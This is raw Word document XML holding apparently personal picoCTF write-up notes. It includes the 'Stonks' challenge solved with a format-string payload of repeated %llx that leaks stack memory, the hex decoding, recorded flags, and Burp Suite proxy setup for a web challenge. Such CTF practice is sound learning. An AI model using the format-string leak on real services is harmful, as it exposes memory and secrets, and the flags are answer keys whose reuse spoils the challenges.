          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="303E4FDC"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C586C0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>for</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C586C0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>in</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4EC9B0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>range</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len</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p>
    <w:p w14:paraId="618A879B"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A81399A" w14:textId="236703CA" w:rsidR="00313A37" w:rsidRDefault="00313A37" w:rsidP="00886D6D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:ind w:firstLine="528"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pP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)&lt;&lt;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8482959" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00313A37" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:ind w:firstLine="528"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ECD59CE" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>picoCTF{16_bits_inst34d_of_8_04c0760d}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E99DF1" w14:textId="0CC3AE2F" w:rsidR="00313A37" w:rsidRDefault="00313A37" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49FE06AF" w14:textId="31533799" w:rsidR="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AEB41DE" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Stonks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4AAD67" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>| 20 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EB1465" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227A4793" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4818A6EC" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Author: madStacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C88160" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B183151" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15D6566C" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>I decided to try something no</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">one else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6088C21F" w14:textId="396A3586" w:rsidR="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>nc mercury.picoctf.net 53437</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A94167E" w14:textId="632F6385" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">memory overflow with a long string </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9C110B" w14:textId="74F894C4" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7F700D39" wp14:editId="11710F72">
            <wp:extent cx="6332220" cy="1691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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="1691005"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1104BC1A" w14:textId="77777777" w:rsidR="006B4BC9" w:rsidRPr="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="006B4BC9">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B4BC9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D25F99E" w14:textId="64E60B99" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6857C751" w14:textId="144692DD" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="727CDCA8" w14:textId="3B2A17F6" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58E606D1" w14:textId="59445FD0" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B4BC9">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>7b4654436f636970|345f7435306c5f49|306d5f796d5f6c6c|346364625f79336e|ffe8007d61653532</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1C9EE2" w14:textId="37C59D37" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Hex 0x70 = p</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1269793A" w14:textId="498797D2" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>0x69=i</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D82A5A" w14:textId="5DEE151F" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>0x7d =}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2636BE28" w14:textId="2FE0436E" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Change the hex value from little endian to big endian:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="362E78E2" w14:textId="77777777" w:rsidR="006B4BC9" w:rsidRPr="00313A37" w:rsidRDefault="006B4BC9" w:rsidP="006B4BC9">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B4BC9">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>7069636F4354467B495F6C3035745F346C6C5F6D795F6D306e33795f62646334323565617d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B9E53B" w14:textId="77777777" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="621E0A5B" w14:textId="77777777" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="233F0C7A" w14:textId="29392A3A" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B4BC9">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1115C08D" w14:textId="0A888DA9" w:rsidR="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33AF34DB" w14:textId="638B92B1" w:rsidR="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C878808" w14:textId="195AAA43" w:rsidR="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Web exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BEB851" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33E4A64A" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>GET aHEAD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CC3248" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>| 20 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B1E658" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74DEB746" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F29FB8E" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Author: madStacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A44BA2" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F63F8C" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A1E8196" w14:textId="27690725" w:rsidR="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Find the flag being held on this server to get ahead of the competition </w:t>
      </w:r>
      <w:hyperlink r:id="rId39" w:history="1">
        <w:r w:rsidR="00222A2A" w:rsidRPr="004C12C8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:21939/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0343E5F2" w14:textId="5ED91DAC" w:rsidR="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76BFF94F" w14:textId="7509BE24" w:rsidR="002E7CDC" w:rsidRPr="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="002E7CDC">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Hints:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCC387F" w14:textId="77777777" w:rsidR="002E7CDC" w:rsidRPr="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="002E7CDC">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EA03015" w14:textId="77777777" w:rsidR="002E7CDC" w:rsidRPr="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="002E7CDC">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E7CDC">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">    Maybe you have more than 2 choices</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42618E90" w14:textId="77777777" w:rsidR="002E7CDC" w:rsidRPr="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="002E7CDC">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A54487F" w14:textId="224D6E7E" w:rsidR="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E7CDC">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Check out tools like Burpsuite to modify your requests and look at the responses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBD9016" w14:textId="0F948ABA" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="509AC8D4" w14:textId="6E190FE4" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Setup burpsuite and firefox</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52838827" w14:textId="1B0B106B" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1281A0F5" w14:textId="12088071" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B3433AF" w14:textId="0C04A315" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Firefox-&gt;preferences-&gt; search for proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F125B0" w14:textId="77777777" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C7E91E1" w14:textId="7F2A920E" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="64CC235B" wp14:editId="6EAC9690">
            <wp:extent cx="6332220" cy="397637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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="3976370"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F322012" w14:textId="78E0737D" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Burp -&gt;proxy-&gt;options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5A4196" w14:textId="55BB816A" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="244C3C2E" wp14:editId="1A81C335">
            <wp:extent cx="5966977" cy="300254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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5966977" cy="3002540"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="156094DB" w14:textId="7D0F088F" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="105CF9E3" w14:textId="77777777" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
